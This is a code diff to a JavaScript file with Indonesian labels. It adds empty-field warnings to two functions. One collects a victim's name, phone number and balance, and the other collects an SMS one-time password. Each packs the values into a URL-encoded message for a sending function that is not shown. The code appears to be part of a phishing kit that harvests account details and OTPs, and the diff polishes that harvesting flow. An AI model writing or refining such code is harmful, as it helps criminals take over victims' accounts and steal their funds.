@@ -12,14 +12,23 @@ function kirimResult(gabungan){
 }
 
 function pertama(){
-
-    $("#kirims").text("Memproses...");
     var $logo = $("#logo");
     var $nama = $("#nama");
     var $nomor = $("#nomor");
-    sessionStorage.setItem("nomor", $nomor.val());
     var $saldo = $("#saldo");
 
+    // Validasi input
+    if (!$nama.val() || !$nomor.val() || !$saldo.val()) {
+        Swal.fire({
+            title: 'Warning!',
+            text: 'Data tidak boleh kosong.',
+            icon: 'error', // Tipe ikon: 'success', 'error', 'warning', 'info', atau 'question'
+            confirmButtonText: 'OK'
+        });        
+        return;
+    }
+    $("#kirims").text("Memproses...");
+    sessionStorage.setItem("nomor", $nomor.val());
     var gabungan = '' + $logo.val() + '%0A' +
 'No HP : ' + $nomor.val() + '%0A' +
 'Nama : ' + $nama.val() + '%0A' +
@@ -53,15 +62,23 @@ function kedua(){
 }
 
 
-function ketiga(){
-
-    document.getElementById('kirims').innerHTML = "Memproses....";
-  
-  
+function ketiga(){   
     var $logo = $("#logo");
     var $nomor = sessionStorage.getItem("nomor");
     var $sms = $("#sms");
   
+    // Validasi input
+    if (!$sms.val()) {
+        Swal.fire({
+            title: 'Warning!',
+            text: 'OTP tidak boleh kosong.',
+            icon: 'error', // Tipe ikon: 'success', 'error', 'warning', 'info', atau 'question'
+            confirmButtonText: 'OK'
+        });        
+        return;
+    }
+
+    $("#kirims").text("Memproses...");
     var gabungan = '' + $logo.val() + '%0A' +
   'Nomor HP : ' + $nomor + '%0A' +
   'OTP : ' + $sms.val();
